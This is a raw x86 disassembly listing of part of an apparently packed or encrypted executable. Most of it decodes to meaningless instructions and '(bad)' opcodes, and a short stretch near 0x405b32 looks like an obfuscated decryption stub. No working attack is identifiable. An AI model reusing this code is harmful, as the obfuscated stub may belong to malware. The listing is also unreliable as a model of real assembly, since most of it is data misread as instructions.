  40598e:	sub    DWORD PTR [edx+0x7a88ac46],ecx
  405994:	sti    
  405995:	and    BYTE PTR ds:0xcd201267,0xc1
  40599c:	push   0x33
  40599e:	aad    0x3
  4059a0:	xchg   ebx,eax
  4059a1:	inc    esp
  4059a2:	scas   eax,DWORD PTR es:[edi]
  4059a3:	mov    esp,0xe1512837
  4059a8:	add    ah,bl
  4059aa:	sub    BYTE PTR [ecx-0x4f5cf5be],ch
  4059b0:	int    0x40
  4059b2:	xchg   edx,eax
  4059b3:	cmp    edx,DWORD PTR [edx+0x2c031e73]
  4059b9:	sub    al,BYTE PTR [edx-0x75]
  4059bc:	push   ss
  4059bd:	fdiv   DWORD PTR [edx]
  4059bf:	popa   
  4059c0:	jo     0x40595e
  4059c2:	push   ds
  4059c3:	inc    ecx
  4059c4:	inc    ebx
  4059c5:	outs   dx,DWORD PTR ds:[esi]
  4059c6:	mov    cl,0xd0
  4059c8:	and    cl,BYTE PTR [esi-0x44]
  4059cb:	les    eax,FWORD PTR [ebp-0x73ff37e]
  4059d1:	sbb    DWORD PTR [edi+0x53],ebp
  4059d4:	dec    ebp
  4059d5:	inc    ecx
  4059d6:	rcr    BYTE PTR [eax-0x363cf9c],cl
  4059dc:	adc    ah,cl
  4059de:	sbb    BYTE PTR [ebp+ebx*4-0x31681ba6],dh
  4059e5:	inc    esi
  4059e6:	dec    edx
  4059e7:	int3   
  4059e8:	push   edx
  4059e9:	push   ecx
  4059ea:	push   esi
  4059eb:	outs   dx,DWORD PTR ds:[esi]
  4059ec:	mov    ecx,0xa4b35f79
  4059f1:	jg     0x405a21
  4059f3:	popa   
  4059f4:	or     DWORD PTR [esi],ebx
  4059f6:	sbb    ah,BYTE PTR [ebp-0x31]
  4059f9:	jmp    0x5e37e2f2
  4059fe:	jp     0x405988
  405a00:	or     ebp,DWORD PTR [ecx+0x5d]
  405a03:	jno    0x4059a8
  405a05:	repnz dec edx
  405a08:	mov    dh,0x3e
  405a0a:	add    ah,BYTE PTR [ebp-0x6b]
  405a0d:	cs xor al,0x44
  405a10:	test   ch,bh
  405a12:	mov    ecx,0x25f78506
  405a17:	mov    al,0xd2
  405a19:	mov    WORD PTR ds:0x62cde49b,cs
  405a1f:	pusha  
  405a20:	xchg   ch,dl
  405a22:	mov    dl,0x93
  405a24:	push   cs
  405a25:	sub    al,0x66
  405a27:	sub    dh,bh
  405a29:	dec    esp
  405a2a:	mov    cl,0x8d
  405a2c:	xor    BYTE PTR [edx+0x290b7e91],ah
  405a32:	shl    BYTE PTR [esi],cl
  405a34:	cs xor ax,0xb117
  405a39:	jg     0x405ab5
  405a3b:	cld    
  405a3c:	dec    ebp
  405a3d:	mov    ebp,0xa9288f74
  405a42:	pop    esi
  405a43:	xor    ah,ch
  405a45:	mov    ah,0x9a
  405a47:	add    edx,DWORD PTR [ecx]
  405a49:	clc    
  405a4a:	in     eax,dx
  405a4b:	mov    ebx,0xf590a722
  405a50:	lock xchg ecx,eax
  405a52:	cmp    DWORD PTR ds:0x7a707b40,eax
  405a58:	stc    
  405a59:	sbb    DWORD PTR [ebx-0x6b6acb2],ebx
  405a5f:	push   edx
  405a60:	hlt    
  405a61:	mov    esp,0x2442ee99
  405a66:	dec    ecx
  405a68:	jmp    0x99eab421
  405a6d:	mov    al,ds:0x59049778
  405a72:	xchg   ebx,eax
  405a73:	clc    
  405a74:	pushf  
  405a75:	enter  0xbff7,0x99
  405a79:	cmp    BYTE PTR [edx+0x79e3bd6],bl
  405a7f:	add    cl,dl
  405a81:	test   al,0x16
  405a83:	test   DWORD PTR [eax-0x61],esi
  405a86:	fsub   DWORD PTR ds:0x3a6a4a6a
  405a8c:	mov    eax,0x3aa4f44c
  405a91:	imul   esp,edi,0x21
  405a94:	sub    DWORD PTR [eax-0x7914c923],esi
  405a9a:	xor    BYTE PTR [ebx],0xaf
  405a9d:	dec    edx
  405a9e:	mov    al,ds:0x7539bb0c
  405aa3:	loop   0x405a82
  405aa5:	hlt    
  405aa6:	(bad)  
  405aa7:	call   DWORD PTR [esi+0x6d]
  405aaa:	xor    BYTE PTR [esi+edx*8],bl
  405aad:	or     bl,BYTE PTR [ecx-0x47]
  405ab0:	nop
  405ab1:	outs   dx,BYTE PTR ds:[esi]
  405ab2:	ja     0x405a5c
  405ab4:	and    ebx,DWORD PTR [ebp+0x46]
  405ab7:	cli    
  405ab8:	sbb    dl,BYTE PTR es:[edi-0x5c6674f0]
  405abf:	xor    eax,0x5e956dc1
  405ac4:	xor    al,0xc8
  405ac6:	push   0x9
  405ac8:	mov    ch,0x8a
  405aca:	and    ebp,DWORD PTR [ecx+0x12079f33]
  405ad0:	cmp    esp,eax
  405ad2:	add    eax,0xba5d9998
  405ad7:	sub    ebp,DWORD PTR [eax]
  405ad9:	test   eax,0xd0dbd7b6
  405ade:	adc    DWORD PTR [ebp+0x56],0x49
  405ae2:	loopne 0x405b07
  405ae4:	(bad)
  405ae7:	addr16 imul edi,esi,0xdb889024
  405aee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aef:	fmul   DWORD PTR [ecx+0x7c1e4625]
  405af5:	mov    ds:0x1f1c80cb,eax
  405afa:	cmp    al,0xd5
  405afc:	das    
  405afd:	pop    esi
  405afe:	ins    BYTE PTR es:[edi],dx
  405aff:	(bad)  
  405b00:	sbb    eax,0xb8c920bf
  405b06:	cwde   
  405b07:	fisttp WORD PTR [edx+0x49c8c2fd]
  405b0d:	mov    db7,eax
  405b10:	adc    DWORD PTR [edx],0xffffffd7
  405b13:	sub    edx,DWORD PTR [edi-0x5e]
  405b16:	sbb    ebx,eax
  405b18:	push   esp
  405b19:	or     ch,dh
  405b1b:	jo     0x405aa1
  405b1d:	fnstsw WORD PTR [edi+0x14ef358f]
  405b23:	or     BYTE PTR [ebx],bh
  405b25:	jae    0x405af4
  405b27:	sub    DWORD PTR ds:0x9e4a2aec,ecx
  405b2d:	sbb    dh,bl
  405b2f:	and    BYTE PTR [esi-0x6f],dh
  405b32:	mov    DWORD PTR [ebp+0x10],ecx
  405b35:	mov    ecx,0xc6d
  405b3a:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  405b41:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  405b48:	mov    ecx,0xf89c8532
  405b4d:	push   esi
  405b4e:	mov    esi,DWORD PTR ds:0x43379b
  405b54:	mov    DWORD PTR [ebp+0x10],0x70019f3
  405b5b:	mov    esi,DWORD PTR [ebp-0x4]
  405b5e:	cmp    ecx,esi
  405b60:	je     0x405b9b
  405b66:	mov    esi,DWORD PTR [ebp+0xc]
  405b69:	xor    ecx,eax
  405b6b:	xor    DWORD PTR ds:0x433753,0x55d1
  405b75:	xor    esi,eax
  405b77:	lea    ecx,[esi+ecx*1+0x32729b]
  405b7e:	xor    ecx,eax
  405b80:	cmp    ecx,0xf89c8521
  405b86:	jne    0x405b4e
  405b8c:	mov    DWORD PTR ds:0x4337a3,0x74e6
  405b96:	jmp    0x4062dd
  405b9b:	add    ecx,0xffcd8d65
  405ba1:	mov    esi,ecx
  405ba3:	xor    esi,eax
  405ba5:	add    esi,DWORD PTR [ebp+0x8]
  405ba8:	mov    DWORD PTR ds:0x4337ef,0x6ead
  405bb2:	mov    DWORD PTR [ebp+0x8],esi
  405bb5:	mov    esi,DWORD PTR [ebp+0x8]
  405bb8:	mov    DWORD PTR ds:0x43382f,0x3a4c
  405bc2:	jmp    0x405f11
  405bc7:	jmp    0x4f7a1a24
  405bcc:	fldcw  WORD PTR [ecx+0x68]
  405bcf:	les    esi,FWORD PTR [esi-0x41]
  405bd2:	adc    eax,0xf72699b9
  405bd7:	call   0x2cbeda11
  405bdc:	jge    0x405c5c
  405bde:	jle    0x405b7d
  405be0:	js     0x405ba5
  405be2:	repz or eax,DWORD PTR [eax+0x4c]
  405be6:	xor    al,al
  405be8:	sar    BYTE PTR [esi-0x35b47a43],1
  405bee:	xchg   ebx,eax
  405bef:	mov    ah,0xb1
  405bf1:	pop    ds
  405bf2:	or     edi,eax
  405bf4:	mov    esi,0xfba4fa47
  405bf9:	pop    esi
  405bfa:	dec    edx
  405bfb:	mov    edi,0x476f7b46
  405c00:	addr16 sbb edx,edx
  405c03:	add    cl,BYTE PTR [ebp+0x369db77d]
  405c09:	xlat   BYTE PTR ds:[ebx]
  405c0a:	fistp  DWORD PTR [esi+ebx*1+0x47]
  405c0e:	mov    esi,0xeea9a3d0
  405c13:	sbb    ecx,DWORD PTR [ecx+0x17]
  405c16:	daa    
  405c17:	add    bh,ch
  405c19:	imul   esi,DWORD PTR [ebx+ebx*4],0xa00f84c9
  405c20:	or     ch,BYTE PTR [edx-0x70f6debc]
  405c26:	add    edx,DWORD PTR [edx]
  405c28:	into   
  405c29:	das    
  405c2a:	and    DWORD PTR [ebx+0x2d1ea1a2],edx
  405c30:	sub    esp,esi
  405c32:	pop    ebx
  405c33:	sub    al,0xf7
  405c35:	retf   0xa51
  405c38:	xlat   BYTE PTR ds:[ebx]
  405c39:	and    DWORD PTR [ebp+0x5c97ed91],esi
  405c3f:	xchg   ecx,eax
  405c40:	outs   dx,DWORD PTR ds:[esi]
  405c41:	jl     0x405c01
  405c43:	leave  
  405c44:	out    0xb9,eax
  405c46:	pop    ecx
  405c47:	(bad)  
  405c48:	rol    DWORD PTR [ebp+0x797693c1],cl
  405c4e:	dec    ecx
  405c4f:	mov    ch,0xc3
  405c51:	sub    al,0x4e
  405c53:	or     DWORD PTR [eax-0x77481856],0x2b4dfa04
  405c5d:	cmp    BYTE PTR [esi],cl
  405c5f:	pop    ebx
  405c60:	push   es
  405c61:	fnstsw WORD PTR [esi+0x3ba2d530]
  405c67:	clc    
  405c68:	scas   eax,DWORD PTR es:[edi]
  405c69:	cmp    eax,0x241fa503
  405c6e:	leave  
  405c6f:	push   ebp
  405c70:	fdivr  QWORD PTR [ecx-0x2]
  405c73:	je     0x405c9f
  405c75:	in     al,dx
  405c76:	mov    dh,0x7b
  405c78:	push   eax
  405c79:	call   0x8f89:0x49a281cc
  405c80:	lods   al,BYTE PTR ds:[esi]
  405c81:	inc    edi
  405c82:	sbb    ebp,DWORD PTR [esp+eax*1-0x1f]
  405c86:	push   ebp
  405c87:	mov    DWORD PTR [ebx],ebp
  405c89:	mov    esp,0x4120fd25
  405c8e:	aam    0x9f
  405c90:	or     al,0xc2
  405c92:	clc    
  405c93:	push   edi
  405c94:	icebp  
  405c95:	and    al,BYTE PTR [ebx-0x6d01be97]
  405c9b:	dec    ebx
  405c9c:	mov    ah,0xe
  405c9e:	out    dx,al
  405c9f:	jp     0x405c57
  405ca1:	jmp    0x8b6d6185
  405ca6:	jne    0x405c4a
  405ca8:	lock mov esp,0xc61d06f0
  405cae:	mov    cl,0xf3
  405cb0:	jp     0x405c86
  405cb2:	gs jne 0x405c93
  405cb5:	jb     0x405cc1
  405cb7:	(bad)  
  405cb8:	mov    edi,0x90c5af39
  405cbd:	add    eax,0x3bfadfcc
  405cc2:	xor    DWORD PTR [ecx-0x6a],ecx
  405cc5:	push   ebx
  405cc6:	sti    
  405cc7:	push   cs
  405cc8:	lock bound ebp,QWORD PTR [esi+0x41]
  405ccc:	shl    BYTE PTR [esp+edi*4+0x5e9aa958],0xa6
  405cd4:	jp     0x405c76
  405cd6:	jo     0x405cdb
  405cd8:	xchg   ebp,eax
  405cd9:	mov    ah,0x6a
  405cdb:	adc    eax,DWORD PTR [edx-0x5d]
  405cde:	(bad)
  405ce3:	add    ch,BYTE PTR [ebx]
  405ce5:	cdq    
  405ce6:	and    edi,edx
  405ce8:	(bad)  
  405cec:	(bad)  
  405ced:	ins    DWORD PTR es:[edi],dx
  405cee:	or     al,0x25
  405cf0:	test   eax,0x9171f750
  405cf5:	inc    ebp
  405cf6:	inc    ebp
  405cf7:	rcl    BYTE PTR [ebx-0x1b],0xa2
  405cfb:	js     0x405d47
  405cfd:	in     eax,dx
  405cfe:	sub    DWORD PTR [ebx+edx*2],ebx
  405d01:	jbe    0x405cf3
  405d03:	xlat   BYTE PTR fs:[ebx]
  405d05:	out    dx,eax
  405d06:	add    dl,BYTE PTR [ecx]
  405d08:	pushf  
  405d09:	jnp    0x405d4b
  405d0b:	leave  
  405d0c:	frstor [edx-0x12]
  405d0f:	das    
  405d10:	test   eax,0x1d4b21d4
  405d15:	sub    cl,BYTE PTR [edx]
  405d17:	retf   0x676c
  405d1a:	xchg   ebp,eax
  405d1b:	push   ebx
  405d1c:	std    
  405d1d:	and    eax,0xf0c31533
  405d22:	push   0xfcfbe1ac
  405d27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d28:	into   
  405d29:	ins    BYTE PTR es:[edi],dx
  405d2a:	sbb    DWORD PTR [edx-0x13451b6d],edi
  405d30:	(bad)  
  405d31:	paddb  mm5,QWORD PTR [ecx]
  405d34:	sub    edx,DWORD PTR [edi+0x4f]
  405d37:	sub    dh,BYTE PTR [edx-0x33e160b4]
  405d3d:	mov    bh,0xe3
  405d3f:	xor    al,0xf9
  405d41:	mov    ds:0xac3ffebb,al
  405d46:	repnz and bh,BYTE PTR [edi-0x60ada3a9]
  405d4d:	adc    eax,0x425286c9
  405d52:	mov    edx,0xa0ffe219
  405d57:	fs mov bl,0xbe
  405d5a:	loopne 0x405d61
  405d5c:	xchg   edi,eax
  405d5d:	in     eax,0x19
  405d5f:	jae    0x405d7f
  405d61:	inc    ebp
  405d62:	push   es
  405d63:	shl    DWORD PTR [esi+0x21a26477],cl
  405d69:	daa    
  405d6a:	xor    BYTE PTR [edi],bh
  405d6c:	add    al,0x2d
  405d6e:	repz cmp BYTE PTR [edi-0x2707b272],dl
  405d75:	mov    eax,ds:0x93bd6241
  405d7a:	push   edi
  405d7b:	mov    eax,ds:0xf72c5907
  405d80:	jp     0x405db8
  405d82:	loop   0x405d3d
  405d84:	repz lds edx,FWORD PTR [ebp+0x59]
  405d88:	(bad)  
  405d89:	fistp  QWORD PTR [esi]
  405d8b:	leave  
  405d8c:	xor    eax,0xe4db0673
  405d91:	push   eax
  405d92:	call   DWORD PTR [esi]
  405d94:	and    bh,al
  405d96:	and    eax,0x3c652222
  405d9b:	jecxz  0x405dfc
  405d9d:	ins    BYTE PTR es:[edi],dx
  405d9e:	mov    ebx,0x5cf92f02
  405da3:	sbb    eax,0x981ef2ee
  405da8:	or     esp,0x6
  405dab:	out    dx,al
  405dac:	xchg   esi,eax
  405dad:	shr    BYTE PTR [ebx],1
  405daf:	mov    WORD PTR [ebp+0x77],es
  405db2:	ins    BYTE PTR es:[edi],dx
  405db3:	add    edx,edi
  405db5:	ret    
  405db6:	xor    al,0x82
  405db8:	js     0x405de7
  405dba:	outs   dx,BYTE PTR ds:[esi]
  405dbb:	sbb    DWORD PTR [ebx+edx*1+0x5d],edi
  405dbf:	outs   dx,DWORD PTR ds:[esi]
  405dc0:	or     al,BYTE PTR [ebp+0x59]
  405dc3:	push   edi
  405dc4:	cmc    
  405dc5:	push   0x2c
  405dc7:	ja     0x405e06
  405dc9:	mov    BYTE PTR [esi],0xba
  405dcc:	mov    ds:0x68a3c49,eax
  405dd1:	inc    ebx
  405dd2:	rol    edi,cl
  405dd4:	outs   dx,BYTE PTR ds:[esi]
  405dd5:	fcom   QWORD PTR [esi-0x4f]
  405dd8:	pop    ebx
  405dd9:	pop    ds
  405dda:	pop    ebp
  405ddb:	mov    eax,0xa03a0e50
  405de0:	sub    dh,dl
  405de2:	fbld   TBYTE PTR [edx]
  405de4:	dec    esi
  405de5:	adc    al,0xe7
  405de7:	nop
  405de8:	pop    esp
  405de9:	out    0xc1,eax
  405deb:	mov    cl,0x2d
  405ded:	sub    eax,0xab1b2ec4
  405df2:	or     cl,dl
  405df4:	jmp    0xac3f39c8
  405df9:	xchg   esp,eax
  405dfa:	mov    BYTE PTR [ebp-0x3a],dl
  405dfd:	mov    ebp,0x75594a09
  405e02:	pop    esi
  405e03:	jl     0x405e00
  405e05:	std    
  405e06:	inc    ebx
  405e07:	rcr    BYTE PTR ds:0x66a45501,0xc6
  405e0e:	push   edi
  405e0f:	pop    eax
  405e10:	push   0x4e830dfd
  405e15:	fidiv  WORD PTR [esi+0x55e7439a]
  405e1b:	outs   dx,BYTE PTR ds:[esi]
  405e1c:	out    0xfb,eax
  405e1e:	ficomp WORD PTR [eax-0x71363f18]
  405e24:	or     al,0x1c
  405e26:	pushf  
  405e27:	push   es
  405e28:	sbb    eax,0x67eff70c
  405e2d:	mov    DWORD PTR [ecx-0x1e],esp
  405e30:	hlt    
  405e31:	dec    DWORD PTR [edi-0x6287c4e]
  405e37:	in     eax,dx
  405e38:	dec    ecx
  405e39:	fld    TBYTE PTR [ecx]
  405e3b:	(bad)  
  405e3c:	daa    
  405e3d:	mov    al,ds:0x8f0ab05
  405e42:	and    al,0x59
  405e44:	push   0x5dbcf438
  405e49:	add    DWORD PTR [edx],0xffffffbf
  405e4c:	inc    ecx
  405e4d:	dec    esi
  405e4e:	fbld   TBYTE PTR [edi+0x6e]
  405e51:	xchg   DWORD PTR [eax],esp
  405e53:	inc    ebp
  405e54:	(bad)  
  405e55:	or     DWORD PTR [esi+0x5],edi
  405e58:	mov    esi,0xc8700592
  405e5d:	xchg   esi,eax
  405e5e:	sar    ebx,cl
  405e60:	nop
  405e61:	or     edi,ebx
  405e63:	popa   
  405e64:	sbb    ebp,esi
  405e66:	(bad)  
  405e67:	mov    eax,ds:0x92c37b75
  405e6c:	in     eax,0xac
  405e6e:	and    DWORD PTR [ecx-0x42],0xffffff97
  405e72:	xchg   edi,eax
  405e73:	or     dh,BYTE PTR [esi]
  405e75:	dec    esi
  405e76:	push   edi
  405e78:	sub    dl,BYTE PTR [ebp-0x1]
  405e7b:	sbb    DWORD PTR [esi-0x2fcde3fb],esi
  405e81:	cmc    
  405e82:	push   0xe1e7e9ff
  405e87:	out    dx,eax
  405e88:	stos   DWORD PTR es:[edi],eax
  405e89:	lods   eax,DWORD PTR ds:[esi]
  405e8a:	pop    eax
  405e8b:	cmp    eax,0x8dbbc3b1
  405e90:	xchg   DWORD PTR [ecx-0x80],edi
  405e93:	jl     0x405f14
  405e95:	(bad)  
  405e96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e97:	cld    
  405e98:	test   al,0xf2
  405e9a:	in     al,dx
  405e9b:	mov    ah,0xde
  405e9d:	and    BYTE PTR [ebp-0x597cbe41],ah
  405ea3:	les    ecx,FWORD PTR [edx]
  405ea5:	push   ss
  405ea6:	imul   ch
  405ea8:	cmp    BYTE PTR [ebx+ecx*8+0x67],bl
  405eac:	cmp    al,BYTE PTR [esp+edx*8-0x61]
  405eb0:	mov    dh,0x89
  405eb2:	mov    ah,0x2e
  405eb4:	mov    eax,0xf2c8493b
  405eb9:	pop    es
  405eba:	or     ecx,0x78
  405ebd:	inc    esp
  405ebe:	push   ss
  405ebf:	push   esi
  405ec0:	ja     0x405e67
  405ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ec3:	shr    BYTE PTR [esi-0x64c62f3c],cl
  405ec9:	push   eax
  405eca:	mov    bh,0x40
  405ecc:	mov    dl,0x5c
  405ece:	dec    edi
  405ecf:	dec    eax
  405ed0:	mov    edi,0x3862fb8d
  405ed5:	push   cs
  405ed6:	xor    bh,ah
  405ed8:	popa   
  405ed9:	nop
  405eda:	jo     0x405ec0
  405edc:	push   ecx
  405edd:	fild   WORD PTR [eax-0x72]
  405ee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ee1:	retf   
  405ee2:	int3   
  405ee3:	les    esi,FWORD PTR [ecx+0x53]
  405ee6:	in     al,0x43
  405ee8:	pop    es
  405ee9:	out    0x5e,al
  405eeb:	xor    eax,0x53bc07c2
  405ef0:	mov    bl,0xe
  405ef2:	cmp    al,0xb4
  405ef4:	dec    esp
  405ef5:	fs mov ebx,0x97a32a75
  405efb:	pop    si
  405efd:	cmp    al,0x26
  405eff:	ja     0x405f18
  405f01:	(bad)  
  405f02:	pusha  
  405f03:	sbb    al,0xe5
  405f05:	cdq    
  405f06:	mov    cl,0xb
  405f08:	inc    esi
  405f09:	push   es
  405f0a:	adc    eax,0x460906d1
  405f0f:	inc    edx
  405f10:	xchg   edi,eax
  405f11:	xor    esi,ecx
  405f13:	neg    ecx
  405f15:	jmp    0x406264
  405f1a:	jne    0x405eee
  405f1c:	sub    al,0xaa
  405f1e:	test   eax,0x31d17170
  405f23:	test   eax,edx
  405f25:	mov    WORD PTR [ecx-0x64],ds
  405f28:	retf   
  405f29:	cmp    ah,BYTE PTR [esi+0x2c7e7e30]
  405f2f:	jge    0x405faf
  405f31:	jle    0x405ebc
  405f33:	nop
  405f34:	cwde   
  405f35:	dec    ecx
  405f36:	shr    DWORD PTR [ebx],0x9b
  405f39:	clc    
  405f3a:	sub    cl,BYTE PTR [edi+0x78d290ed]
  405f40:	cld    
  405f41:	lock cmp al,0x7f
  405f44:	loopne 0x405f28
  405f46:	dec    esi
  405f47:	xchg   ecx,eax
  405f48:	mov    ah,BYTE PTR [esi]
  405f4a:	scas   eax,DWORD PTR es:[edi]
  405f4b:	mov    ds:0x893927d1,al
  405f50:	cdq    
  405f51:	adc    esi,DWORD PTR [ecx+0x4ff37c82]
  405f57:	jmp    0x405fa7
  405f59:	out    0xe9,eax
  405f5b:	push   0x63
  405f5d:	es cmc 
  405f5f:	dec    ebx
  405f60:	and    BYTE PTR [edx],0xd
  405f63:	je     0x405fb4
  405f65:	inc    eax
  405f66:	inc    eax
  405f67:	push   edi
  405f68:	sbb    DWORD PTR [ebx],ebx
  405f6a:	enter  0xeb3,0x85
  405f6e:	jb     0x405f31
  405f70:	fwait
  405f71:	rol    DWORD PTR [ebx+0x43],0xf7
  405f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f76:	ja     0x405f2b
  405f78:	inc    eax
  405f79:	(bad)  
  405f7a:	(bad)  
  405f7b:	jae    0x405f7a
  405f7d:	lods   eax,DWORD PTR ds:[esi]
  405f7e:	popa   
  405f7f:	inc    edx
  405f80:	sbb    ebx,eax
  405f82:	ror    esp,1
  405f84:	into   
  405f85:	bound  eax,QWORD PTR [eax-0x33]
  405f88:	fwait
  405f89:	and    dl,BYTE PTR [esi-0x58]
  405f8c:	cld    
  405f8d:	mov    dh,0xc5
  405f8f:	stos   BYTE PTR es:[edi],al
  405f90:	in     al,dx
  405f91:	push   0xffffff8f
  405f93:	fadd   QWORD PTR [esp+eax*4]
  405f96:	shl    bl,1
  405f98:	inc    esi
  405f99:	stc    
  405f9a:	cmp    eax,0x94efef15
  405f9f:	jae    0x405f9f
  405fa1:	xchg   ebp,eax
  405fa2:	xor    al,0x41
  405fa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fa5:	xor    edx,DWORD PTR [ebx]
  405fa7:	mov    al,0xd
  405fa9:	js     0x405f82
  405fab:	jbe    0x405f8c
  405fad:	xlat   BYTE PTR ds:[ebx]
  405fae:	cs sbb al,0xbd
  405fb1:	jge    0x406002
  405fb3:	pop    ecx
  405fb4:	sub    bh,dh
  405fb6:	out    0xc,al
  405fb8:	pop    edi
  405fb9:	pop    ss
  405fba:	mov    bl,0xc7
  405fbc:	scas   eax,DWORD PTR es:[edi]
  405fbd:	dec    esp
  405fbe:	jb     0x405fd3
  405fc0:	inc    edx
  405fc1:	inc    esi
  405fc2:	data16 or bl,0x70
  405fc6:	ficom  DWORD PTR [esi]
  405fc8:	push   es
  405fc9:	lods   al,BYTE PTR ds:[esi]
  405fca:	pop    edx
  405fcb:	(bad)  
  405fcc:	loopne 0x405fb8
  405fce:	scas   eax,DWORD PTR es:[edi]
  405fcf:	shl    ebx,cl
  405fd1:	jo     0x405f88
  405fd3:	mov    esi,0x4520b318
  405fd8:	add    dh,0x91
  405fdb:	cwde   
  405fdc:	or     BYTE PTR [esi-0x64],ah
  405fdf:	xor    al,0xd1
  405fe1:	es inc eax
  405fe3:	pop    eax
  405fe4:	push   esp
  405fe5:	cmp    dl,BYTE PTR [eax-0x22]
  405fe8:	icebp  
  405fe9:	aaa    
  405fea:	sub    al,0x9c
  405fec:	mov    ds:0x320257a1,al
  405ff1:	jne    0x405fda
  405ff3:	mov    al,ds:0xb520cea3
  405ff8:	xchg   esp,eax
  405ff9:	jmp    0x9ce5:0x7c1e8456
  406000:	inc    esi
  406001:	push   ecx
  406002:	mov    dh,BYTE PTR [esi-0x2a6da746]
  406008:	xchg   DWORD PTR [esi+0x62],ebp
  40600b:	mov    bl,0xee
  40600d:	ret    
  40600e:	shl    BYTE PTR [eax+0x756b8647],0xf3
  406015:	mov    bl,0xa
  406017:	inc    esp
  406018:	dec    ebx
  406019:	cmp    bh,bh
  40601b:	mov    esi,0x44f520f7
  406020:	or     bl,dl
  406022:	mov    ebp,0xa6b3c0eb
  406027:	mov    dh,0x80
  406029:	mov    ds:0x820af162,al
  40602e:	jmp    0x117e89ff
  406033:	ins    DWORD PTR es:[edi],dx
  406034:	push   ss
  406035:	stos   BYTE PTR es:[edi],al
  406036:	dec    ebp
  406037:	xchg   bl,ah
  406039:	(bad)  
  40603a:	mov    ah,BYTE PTR [edi-0x41]
  40603d:	adc    dh,bh
  40603f:	ret    
  406040:	lods   al,BYTE PTR ds:[esi]
  406041:	sbb    BYTE PTR [edi+edi*1-0x36],0xc5
  406046:	cdq    
  406047:	imul   ebp,DWORD PTR ds:0x45af98bf,0x389ab9e1
  406051:	rol    DWORD PTR ds:0x88b5bda2,0x61
  406058:	sub    DWORD PTR [ebp+ebx*4-0x29ad65b4],esp
  40605f:	push   ecx
  406060:	mov    ecx,0xf9215574
  406065:	add    dh,BYTE PTR [eax-0x4f17668]
  40606b:	or     cl,BYTE PTR [ecx+edi*1]
  40606e:	outs   dx,DWORD PTR ds:[esi]
  40606f:	jnp    0x40604b
  406071:	and    BYTE PTR ds:0x65b61d9b,dl
  406077:	mov    dl,0xdf
  406079:	pop    edi
  40607a:	mov    cl,0xc3
  40607c:	push   edx
  40607d:	dec    esp
  40607e:	gs ja  0x406027
  406081:	scas   eax,DWORD PTR es:[edi]
  406082:	stos   BYTE PTR es:[edi],al
  406083:	(bad)
  406086:	gs gs mov edi,eax
  40608a:	inc    ebx
  40608b:	inc    ebp
  40608c:	inc    edi
  40608d:	sub    BYTE PTR [ebx+0xd],0xc2
  406091:	pop    ecx
  406092:	dec    ebx
  406093:	sbb    dl,BYTE PTR [eax]
  406095:	scas   eax,DWORD PTR es:[edi]
  406096:	lods   al,BYTE PTR ds:[esi]
  406097:	and    BYTE PTR ss:[eax],ah
  40609a:	cmp    esp,edi
  40609c:	or     ebx,ebx
  40609e:	xchg   edi,eax
  40609f:	pushf  
  4060a0:	xchg   ebp,eax
  4060a1:	fsub   st,st(1)
  4060a3:	fsub   st(2),st
  4060a5:	xlat   BYTE PTR ds:[ebx]
  4060a6:	stc    
  4060a7:	add    al,0x71
  4060a9:	mov    cs,esi
  4060ab:	and    eax,0x28561d7e
  4060b0:	cmp    al,0x9
  4060b2:	sub    dh,0x25
  4060b5:	add    ecx,DWORD PTR [eax]
  4060b7:	(bad)  
  4060b8:	xchg   edi,eax
  4060b9:	mov    eax,0x4fbc2a9b
  4060be:	push   ebx
  4060bf:	pop    esi
  4060c0:	pusha  
  4060c1:	add    al,0x4a
  4060c3:	push   ebp
  4060c4:	retf   
  4060c5:	imul   bh
  4060c7:	and    ebx,DWORD PTR [eax-0x55ae0d7a]
  4060cd:	rcl    DWORD PTR [edx+0x21],1
  4060d0:	mov    ch,0xe1
  4060d2:	repnz (bad) 
  4060d4:	test   eax,0x112fc3f0
  4060d9:	mov    esi,0x214654ac
  4060de:	push   esp
  4060df:	mov    ds:0x2571c9be,al
  4060e4:	and    DWORD PTR [edx],edx
  4060e6:	and    DWORD PTR [ecx],0x7da62ab1
  4060ec:	add    DWORD PTR [ebp-0x3eba8dbd],0x25
  4060f3:	push   es
  4060f4:	mov    ah,0x19
  4060f6:	jno    0x406162
  4060f8:	xchg   ebx,eax
  4060f9:	and    BYTE PTR [ecx],dh
  4060fb:	repnz mov eax,0xcc58254d
  406101:	inc    edx
  406102:	dec    esp
  406103:	mov    edx,0x6a2fc83e
  406108:	dec    esi
  406109:	das    
  40610a:	scas   eax,DWORD PTR es:[edi]
  40610b:	jns    0x4060ee
  40610d:	repz dec BYTE PTR [ebx+edi*8]
  406111:	sahf   
  406112:	mov    eax,0x4cffe7a5
  406117:	cmc    
  406118:	int3   
  406119:	push   esi
  40611a:	lahf   
  40611b:	sub    ch,dh
  40611d:	push   0xbfc9bc3d
  406122:	jnp    0x4060a5
  406124:	xchg   edx,eax
  406125:	iret   
  406126:	pop    eax
  406127:	jmp    0xc00f0c84
  40612c:	jle    0x40617f
  40612e:	inc    edi
  40612f:	cmp    bh,al
  406131:	out    dx,al
  406132:	mov    bh,0x2a
  406134:	mov    edi,0xc0a8b5ac
  406139:	fdivr  QWORD PTR [ecx]
  40613b:	(bad)  
  40613c:	mov    bl,0xb9
  40613e:	push   ebp
  40613f:	sbb    BYTE PTR [edx],dh
  406141:	enter  0xa2ed,0xf5
  406145:	or     edi,DWORD PTR [ecx]
  406147:	mov    dh,0xa6
  406149:	pop    edi
  40614a:	pop    ebx
  40614b:	cmp    eax,0x3a40c300
  406150:	retf   0xddcd
  406153:	push   0x75c4deda
  406158:	adc    DWORD PTR [edx+0x5e],edi
  40615b:	ins    DWORD PTR es:[edi],dx
  40615c:	aam    0x29
  40615e:	loop   0x406175
  406160:	sbb    bl,ah
  406162:	inc    ebp
  406163:	pop    ecx
  406164:	dec    edx
  406165:	fstp   DWORD PTR [edx]
  406167:	cwde   
  406168:	jle    0x4061e4
  40616a:	sub    dl,bl
  40616c:	jno    0x4061ec
